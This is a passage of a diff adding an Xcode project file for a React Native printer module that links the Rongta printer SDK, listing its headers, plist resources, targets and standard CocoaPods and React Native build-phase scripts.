+		B18747CF25E67A22005BF549 /* PrinterInterface.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PrinterInterface.h; sourceTree = "<group>"; };
+		B18747D025E67A22005BF549 /* LabelPrinterFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LabelPrinterFactory.h; sourceTree = "<group>"; };
+		B18747D125E67A22005BF549 /* ThermalPrinterFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ThermalPrinterFactory.h; sourceTree = "<group>"; };
+		B18747D225E67A22005BF549 /* CPCLFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CPCLFactory.h; sourceTree = "<group>"; };
+		B18747D325E67A22005BF549 /* CommonSetting.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CommonSetting.h; sourceTree = "<group>"; };
+		B18747D525E67A22005BF549 /* BlueToothFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BlueToothFactory.h; sourceTree = "<group>"; };
+		B18747D625E67A22005BF549 /* Cmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Cmd.h; sourceTree = "<group>"; };
+		B18747D725E67A22005BF549 /* RTDeviceinfo.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RTDeviceinfo.h; sourceTree = "<group>"; };
+		B18747D825E67A22005BF549 /* LabelPrinter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LabelPrinter.h; sourceTree = "<group>"; };
+		B18747D925E67A22005BF549 /* PrinterFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PrinterFactory.h; sourceTree = "<group>"; };
+		B18747DA25E67A22005BF549 /* TSCFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TSCFactory.h; sourceTree = "<group>"; };
+		B18747DB25E67A22005BF549 /* PinPrinterFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PinPrinterFactory.h; sourceTree = "<group>"; };
+		B187485225E6B327005BF549 /* Settings.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = Settings.bundle; sourceTree = "<group>"; };
+		B187486425E6BD62005BF549 /* Sdk */ = {isa = PBXFileReference; lastKnownFileType = folder; name = Sdk; path = ../../../../../Downloads/PrinterExample/Sdk; sourceTree = "<group>"; };
+		B187488225E6C1EE005BF549 /* libRTPrinterSDK.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libRTPrinterSDK.a; path = "../../../../../Downloads/PrinterExample 2/Sdk/libRTPrinterSDK.a"; sourceTree = "<group>"; };
+		DFD775A7BEEDC6BFBBB4FC93 /* Pods-rongtaModule-tvOS.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-tvOS.debug.xcconfig"; path = "Target Support Files/Pods-rongtaModule-tvOS/Pods-rongtaModule-tvOS.debug.xcconfig"; sourceTree = "<group>"; };
+		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
+		F6C6552703662B82177D4B8B /* libPods-rongtaModule-tvOSTests.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-rongtaModule-tvOSTests.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		00E356EB1AD99517003FC87E /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B187488425E6C1EE005BF549 /* libRTPrinterSDK.a in Frameworks */,
+				0201B8F05E5F7BFAD45C336D /* libPods-rongtaModule-rongtaModuleTests.a in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		13B07F8C1A680F5B00A75B9A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				15D7F14725EA03D40079BA11 /* CoreBluetooth.framework in Frameworks */,
+				B187488325E6C1EE005BF549 /* libRTPrinterSDK.a in Frameworks */,
+				261E7E5B3221CA0DD96FECAD /* libPods-rongtaModule.a in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E4781E0B4A5D006451C7 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				82AA7FCFA530F1D078B0936F /* libPods-rongtaModule-tvOS.a in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E48D1E0B4A5D006451C7 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B57ED49B81D4E69B6C1992FA /* libPods-rongtaModule-tvOSTests.a in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		00E356EF1AD99517003FC87E /* rongtaModuleTests */ = {
+			isa = PBXGroup;
+			children = (
+				00E356F21AD99517003FC87E /* rongtaModuleTests.m */,
+				00E356F01AD99517003FC87E /* Supporting Files */,
+			);
+			path = rongtaModuleTests;
+			sourceTree = "<group>";
+		};
+		00E356F01AD99517003FC87E /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				00E356F11AD99517003FC87E /* Info.plist */,
+			);
+			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		13B07FAE1A68108700A75B9A /* rongtaModule */ = {
+			isa = PBXGroup;
+			children = (
+				B18747B125E67A22005BF549 /* Sdk */,
+				13B07FAF1A68108700A75B9A /* AppDelegate.h */,
+				13B07FB01A68108700A75B9A /* AppDelegate.m */,
+				13B07FB51A68108700A75B9A /* Images.xcassets */,
+				13B07FB61A68108700A75B9A /* Info.plist */,
+				81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */,
+				13B07FB71A68108700A75B9A /* main.m */,
+			);
+			name = rongtaModule;
+			sourceTree = "<group>";
+		};
+		150C33EB25F1D6B9009AC817 /* plist */ = {
+			isa = PBXGroup;
+			children = (
+				150C33EC25F1D6B9009AC817 /* port_type.plist */,
+				150C33EE25F1D6B9009AC817 /* label_direct.plist */,
+				150C33F025F1D6B9009AC817 /* font_attrib.plist */,
+				150C33F225F1D6B9009AC817 /* cut_mode.plist */,
+				150C33F425F1D6B9009AC817 /* template.plist */,
+				150C33F625F1D6B9009AC817 /* print_color.plist */,
+				150C33FE25F1D6B9009AC817 /* label_speed.plist */,
+				150C33FF25F1D6B9009AC817 /* text_encoding.plist */,
+				150C340025F1D6B9009AC817 /* font_attrib_icon.plist */,
+				150C340725F1D6B9009AC817 /* barcode_type.plist */,
+				150C340825F1D6B9009AC817 /* label_space.plist */,
+				150C340925F1D6B9009AC817 /* label_size_dc.plist */,
+				150C340A25F1D6B9009AC817 /* font_size.plist */,
+				150C340B25F1D6B9009AC817 /* label_cmd_set.plist */,
+				150C340C25F1D6B9009AC817 /* ble_writetype.plist */,
+				150C340D25F1D6B9009AC817 /* instruction.plist */,
+				150C340E25F1D6B9009AC817 /* nvbitmap.plist */,
+				150C340F25F1D6B9009AC817 /* label_size.plist */,
+				150C341025F1D6B9009AC817 /* ble_serial.plist */,
+				150C341125F1D6B9009AC817 /* codepage.plist */,
+				150C341225F1D6B9009AC817 /* label_chroma.plist */,
+			);
+			path = plist;
+			sourceTree = "<group>";
+		};
+		2D16E6871FA4F8E400B85C8A /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				15D7F14625EA03D40079BA11 /* CoreBluetooth.framework */,
+				B187488225E6C1EE005BF549 /* libRTPrinterSDK.a */,
+				ED297162215061F000B7C4FE /* JavaScriptCore.framework */,
+				273BFC6C069C64A5F85596FA /* libPods-rongtaModule.a */,
+				040789654F251257DCF1BF72 /* libPods-rongtaModule-rongtaModuleTests.a */,
+				098BC2A30F282F082A2E68FF /* libPods-rongtaModule-tvOS.a */,
+				F6C6552703662B82177D4B8B /* libPods-rongtaModule-tvOSTests.a */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		832341AE1AAA6A7D00B99B32 /* Libraries */ = {
+			isa = PBXGroup;
+			children = (
+				83CBBA001A601CBA00E9B192 /* Products */,
+				B187486425E6BD62005BF549 /* Sdk */,
+			);
+			name = Libraries;
+			sourceTree = "<group>";
+		};
+		83CBB9F61A601CBA00E9B192 = {
+			isa = PBXGroup;
+			children = (
+				B187485225E6B327005BF549 /* Settings.bundle */,
+				B187477B25E5624B005BF549 /* RNRongta.h */,
+				B187477C25E5624B005BF549 /* RNRongta.m */,
+				15DDDCAA25F1D75D006E4EF4 /* PlistUtils.h */,
+				B15E917625EABFF8004670A4 /* PrinterManager.h */,
+				B15E917725EABFF8004670A4 /* PrinterManager.m */,
+				150C33EB25F1D6B9009AC817 /* plist */,
+				13B07FAE1A68108700A75B9A /* rongtaModule */,
+				832341AE1AAA6A7D00B99B32 /* Libraries */,
+				00E356EF1AD99517003FC87E /* rongtaModuleTests */,
+				2D16E6871FA4F8E400B85C8A /* Frameworks */,
+				9822E3A4959057C7AEC0E733 /* Pods */,
+			);
+			indentWidth = 2;
+			sourceTree = "<group>";
+			tabWidth = 2;
+			usesTabs = 0;
+		};
+		83CBBA001A601CBA00E9B192 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				13B07F961A680F5B00A75B9A /* rongtaModule.app */,
+				00E356EE1AD99517003FC87E /* rongtaModuleTests.xctest */,
+				2D02E47B1E0B4A5D006451C7 /* rongtaModule-tvOS.app */,
+				2D02E4901E0B4A5D006451C7 /* rongtaModule-tvOSTests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		9822E3A4959057C7AEC0E733 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				1A5BE9D9983BA06A4265F68F /* Pods-rongtaModule.debug.xcconfig */,
+				52A5B54B95911B6F21974079 /* Pods-rongtaModule.release.xcconfig */,
+				3625E43FD0FA3692B8404432 /* Pods-rongtaModule-rongtaModuleTests.debug.xcconfig */,
+				65A7543C2741765C4DBD13B4 /* Pods-rongtaModule-rongtaModuleTests.release.xcconfig */,
+				DFD775A7BEEDC6BFBBB4FC93 /* Pods-rongtaModule-tvOS.debug.xcconfig */,
+				A47FED5D018BEE58D37637D9 /* Pods-rongtaModule-tvOS.release.xcconfig */,
+				3CCDBB4B95A014B7E239441B /* Pods-rongtaModule-tvOSTests.debug.xcconfig */,
+				50D173938BCC7B7EBF075A6E /* Pods-rongtaModule-tvOSTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		B18747B125E67A22005BF549 /* Sdk */ = {
+			isa = PBXGroup;
+			children = (
+				B18747B225E67A22005BF549 /* libRTPrinterSDK.a */,
+				B18747B325E67A22005BF549 /* include */,
+			);
+			path = Sdk;
+			sourceTree = "<group>";
+		};
+		B18747B325E67A22005BF549 /* include */ = {
+			isa = PBXGroup;
+			children = (
+				B18747B425E67A22005BF549 /* RTPrinterSDK */,
+			);
+			path = include;
+			sourceTree = "<group>";
+		};
+		B18747B425E67A22005BF549 /* RTPrinterSDK */ = {
+			isa = PBXGroup;
+			children = (
+				B18747B525E67A22005BF549 /* ZPLFactory.h */,
+				B18747B625E67A22005BF549 /* NetworkPrinter.h */,
+				B18747B725E67A22005BF549 /* ThermalPrinter.h */,
+				B18747B825E67A22005BF549 /* Printer.h */,
+				B18747B925E67A22005BF549 /* CPCLCmd.h */,
+				B18747BA25E67A22005BF549 /* PinCmdFactory.h */,
+				B18747BB25E67A22005BF549 /* CmdFactory.h */,
+				B18747BC25E67A22005BF549 /* Header.h */,
+				B18747BD25E67A22005BF549 /* TextSetting.h */,
+				B18747BE25E67A22005BF549 /* ZPLCmd.h */,
+				B18747BF25E67A22005BF549 /* EnumTypeDef.h */,
+				B18747C025E67A22005BF549 /* PrinterStatusObj.h */,
+				B18747C125E67A22005BF549 /* BarcodeSetting.h */,
+				B18747C225E67A22005BF549 /* WifiInterface.h */,
+				B18747C325E67A22005BF549 /* WIFIFactory.h */,
+				B18747C425E67A22005BF549 /* ESCCmd.h */,
+				B18747C525E67A22005BF549 /* RTBlueToothPI.h */,
+				B18747C625E67A22005BF549 /* PinPrinter.h */,
+				B18747C725E67A22005BF549 /* SafeMutableArray.h */,
+				B18747C825E67A22005BF549 /* PIFactory.h */,
+				B18747C925E67A22005BF549 /* ObserverObj.h */,
+				B18747CA25E67A22005BF549 /* ESCFactory.h */,
+				B18747CB25E67A22005BF549 /* LabelCommonSetting.h */,
+				B18747CC25E67A22005BF549 /* TSCCmd.h */,
+				B18747CD25E67A22005BF549 /* BitmapSetting.h */,
+				B18747CE25E67A22005BF549 /* PinCmd.h */,
+				B18747CF25E67A22005BF549 /* PrinterInterface.h */,
+				B18747D025E67A22005BF549 /* LabelPrinterFactory.h */,
+				B18747D125E67A22005BF549 /* ThermalPrinterFactory.h */,
+				B18747D225E67A22005BF549 /* CPCLFactory.h */,
+				B18747D325E67A22005BF549 /* CommonSetting.h */,
+				B18747D525E67A22005BF549 /* BlueToothFactory.h */,
+				B18747D625E67A22005BF549 /* Cmd.h */,
+				B18747D725E67A22005BF549 /* RTDeviceinfo.h */,
+				B18747D825E67A22005BF549 /* LabelPrinter.h */,
+				B18747D925E67A22005BF549 /* PrinterFactory.h */,
+				B18747DA25E67A22005BF549 /* TSCFactory.h */,
+				B18747DB25E67A22005BF549 /* PinPrinterFactory.h */,
+			);
+			path = RTPrinterSDK;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		00E356ED1AD99517003FC87E /* rongtaModuleTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 00E357021AD99517003FC87E /* Build configuration list for PBXNativeTarget "rongtaModuleTests" */;
+			buildPhases = (
+				6D23CAE8248303BA039737AC /* [CP] Check Pods Manifest.lock */,
+				E8241171496E3E86EEAAC43A /* Build Assets Catalog */,
+				00E356EA1AD99517003FC87E /* Sources */,
+				00E356EB1AD99517003FC87E /* Frameworks */,
+				00E356EC1AD99517003FC87E /* Resources */,
+				300127EB314FABD0594AB6D4 /* [CP] Embed Pods Frameworks */,
+				C8317745AAF11BEC6F2530A6 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				00E356F51AD99517003FC87E /* PBXTargetDependency */,
+			);
+			name = rongtaModuleTests;
+			productName = rongtaModuleTests;
+			productReference = 00E356EE1AD99517003FC87E /* rongtaModuleTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		13B07F861A680F5B00A75B9A /* rongtaModule */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "rongtaModule" */;
+			buildPhases = (
+				83FFC64035EAF89A3DB5CFE5 /* [CP] Check Pods Manifest.lock */,
+				FD10A7F022414F080027D42C /* Start Packager */,
+				13B07F871A680F5B00A75B9A /* Sources */,
+				13B07F8C1A680F5B00A75B9A /* Frameworks */,
+				13B07F8E1A680F5B00A75B9A /* Resources */,
+				00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */,
+				230E47882C099E27200B09E1 /* [CP] Embed Pods Frameworks */,
+				73A177900B4CEC0B3FB30F0D /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = rongtaModule;
+			productName = rongtaModule;
+			productReference = 13B07F961A680F5B00A75B9A /* rongtaModule.app */;
+			productType = "com.apple.product-type.application";
+		};
+		2D02E47A1E0B4A5D006451C7 /* rongtaModule-tvOS */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 2D02E4BA1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "rongtaModule-tvOS" */;
+			buildPhases = (
+				E1584B245A645C9891E7047A /* [CP] Check Pods Manifest.lock */,
+				FD10A7F122414F3F0027D42C /* Start Packager */,
+				2D02E4771E0B4A5D006451C7 /* Sources */,
+				2D02E4781E0B4A5D006451C7 /* Frameworks */,
+				2D02E4791E0B4A5D006451C7 /* Resources */,
+				2D02E4CB1E0B4B27006451C7 /* Bundle React Native Code And Images */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = "rongtaModule-tvOS";
+			productName = "rongtaModule-tvOS";
+			productReference = 2D02E47B1E0B4A5D006451C7 /* rongtaModule-tvOS.app */;
+			productType = "com.apple.product-type.application";
+		};
+		2D02E48F1E0B4A5D006451C7 /* rongtaModule-tvOSTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 2D02E4BB1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "rongtaModule-tvOSTests" */;
+			buildPhases = (
+				146429FECA838F166B77EDBE /* [CP] Check Pods Manifest.lock */,
+				2D02E48C1E0B4A5D006451C7 /* Sources */,
+				2D02E48D1E0B4A5D006451C7 /* Frameworks */,
+				2D02E48E1E0B4A5D006451C7 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				2D02E4921E0B4A5D006451C7 /* PBXTargetDependency */,
+			);
+			name = "rongtaModule-tvOSTests";
+			productName = "rongtaModule-tvOSTests";
+			productReference = 2D02E4901E0B4A5D006451C7 /* rongtaModule-tvOSTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		83CBB9F71A601CBA00E9B192 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 1130;
+				TargetAttributes = {
+					00E356ED1AD99517003FC87E = {
+						CreatedOnToolsVersion = 6.2;
+						DevelopmentTeam = 9AK576J4RE;
+						TestTargetID = 13B07F861A680F5B00A75B9A;
+					};
+					13B07F861A680F5B00A75B9A = {
+						LastSwiftMigration = 1120;
+					};
+					2D02E47A1E0B4A5D006451C7 = {
+						CreatedOnToolsVersion = 8.2.1;
+						ProvisioningStyle = Automatic;
+					};
+					2D02E48F1E0B4A5D006451C7 = {
+						CreatedOnToolsVersion = 8.2.1;
+						ProvisioningStyle = Automatic;
+						TestTargetID = 2D02E47A1E0B4A5D006451C7;
+					};
+				};
+			};
+			buildConfigurationList = 83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "rongtaModule" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+				"zh-Hans",
+				"zh-Hant",
+			);
+			mainGroup = 83CBB9F61A601CBA00E9B192;
+			productRefGroup = 83CBBA001A601CBA00E9B192 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				13B07F861A680F5B00A75B9A /* rongtaModule */,
+				00E356ED1AD99517003FC87E /* rongtaModuleTests */,
+				2D02E47A1E0B4A5D006451C7 /* rongtaModule-tvOS */,
+				2D02E48F1E0B4A5D006451C7 /* rongtaModule-tvOSTests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		00E356EC1AD99517003FC87E /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B187485425E6B327005BF549 /* Settings.bundle in Resources */,
+				150C343C25F1D6B9009AC817 /* label_chroma.plist in Resources */,
+				150C342825F1D6B9009AC817 /* label_space.plist in Resources */,
+				150C341825F1D6B9009AC817 /* font_attrib.plist in Resources */,
+				150C342425F1D6B9009AC817 /* font_attrib_icon.plist in Resources */,
+				150C341425F1D6B9009AC817 /* port_type.plist in Resources */,
+				150C343025F1D6B9009AC817 /* ble_writetype.plist in Resources */,
+				150C342025F1D6B9009AC817 /* label_speed.plist in Resources */,
+				150C342625F1D6B9009AC817 /* barcode_type.plist in Resources */,
+				150C341625F1D6B9009AC817 /* label_direct.plist in Resources */,
+				150C342C25F1D6B9009AC817 /* font_size.plist in Resources */,
+				150C343A25F1D6B9009AC817 /* codepage.plist in Resources */,
+				150C341A25F1D6B9009AC817 /* cut_mode.plist in Resources */,
+				150C342225F1D6B9009AC817 /* text_encoding.plist in Resources */,
+				150C343625F1D6B9009AC817 /* label_size.plist in Resources */,
+				150C343825F1D6B9009AC817 /* ble_serial.plist in Resources */,
+				150C342E25F1D6B9009AC817 /* label_cmd_set.plist in Resources */,
+				150C343225F1D6B9009AC817 /* instruction.plist in Resources */,
+				B187486625E6BD62005BF549 /* Sdk in Resources */,
+				150C342A25F1D6B9009AC817 /* label_size_dc.plist in Resources */,
+				150C343425F1D6B9009AC817 /* nvbitmap.plist in Resources */,
+				150C341E25F1D6B9009AC817 /* print_color.plist in Resources */,
+				150C341C25F1D6B9009AC817 /* template.plist in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		13B07F8E1A680F5B00A75B9A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				150C342325F1D6B9009AC817 /* font_attrib_icon.plist in Resources */,
+				B187485325E6B327005BF549 /* Settings.bundle in Resources */,
+				150C343925F1D6B9009AC817 /* codepage.plist in Resources */,
+				150C343125F1D6B9009AC817 /* instruction.plist in Resources */,
+				150C342525F1D6B9009AC817 /* barcode_type.plist in Resources */,
+				150C341525F1D6B9009AC817 /* label_direct.plist in Resources */,
+				150C343525F1D6B9009AC817 /* label_size.plist in Resources */,
+				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
+				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
+				150C342925F1D6B9009AC817 /* label_size_dc.plist in Resources */,
+				150C342725F1D6B9009AC817 /* label_space.plist in Resources */,
+				150C342D25F1D6B9009AC817 /* label_cmd_set.plist in Resources */,
+				150C341B25F1D6B9009AC817 /* template.plist in Resources */,
+				150C342F25F1D6B9009AC817 /* ble_writetype.plist in Resources */,
+				150C341325F1D6B9009AC817 /* port_type.plist in Resources */,
+				150C343325F1D6B9009AC817 /* nvbitmap.plist in Resources */,
+				150C342B25F1D6B9009AC817 /* font_size.plist in Resources */,
+				150C343725F1D6B9009AC817 /* ble_serial.plist in Resources */,
+				150C341D25F1D6B9009AC817 /* print_color.plist in Resources */,
+				150C341F25F1D6B9009AC817 /* label_speed.plist in Resources */,
+				150C342125F1D6B9009AC817 /* text_encoding.plist in Resources */,
+				150C343B25F1D6B9009AC817 /* label_chroma.plist in Resources */,
+				150C341725F1D6B9009AC817 /* font_attrib.plist in Resources */,
+				150C341925F1D6B9009AC817 /* cut_mode.plist in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E4791E0B4A5D006451C7 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				2D02E4BD1E0B4A84006451C7 /* Images.xcassets in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E48E1E0B4A5D006451C7 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			name = "Bundle React Native code and images";
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "export NODE_BINARY=node\n../node_modules/react-native/scripts/react-native-xcode.sh";
+		};
+		146429FECA838F166B77EDBE /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-rongtaModule-tvOSTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		230E47882C099E27200B09E1 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-rongtaModule/Pods-rongtaModule-frameworks.sh",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/OpenSSL/OpenSSL.framework/OpenSSL",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/OpenSSL.framework",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-rongtaModule/Pods-rongtaModule-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		2D02E4CB1E0B4B27006451C7 /* Bundle React Native Code And Images */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			name = "Bundle React Native Code And Images";
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "export NODE_BINARY=node\n../node_modules/react-native/scripts/react-native-xcode.sh";
+		};
+		300127EB314FABD0594AB6D4 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests-frameworks.sh",
+				"${PODS_XCFRAMEWORKS_BUILD_DIR}/OpenSSL/OpenSSL.framework/OpenSSL",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/OpenSSL.framework",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		6D23CAE8248303BA039737AC /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-rongtaModule-rongtaModuleTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		73A177900B4CEC0B3FB30F0D /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-rongtaModule/Pods-rongtaModule-resources.sh",
+				"${PODS_CONFIGURATION_BUILD_DIR}/React-Core/AccessibilityResources.bundle",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/AccessibilityResources.bundle",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-rongtaModule/Pods-rongtaModule-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		83FFC64035EAF89A3DB5CFE5 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-rongtaModule-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
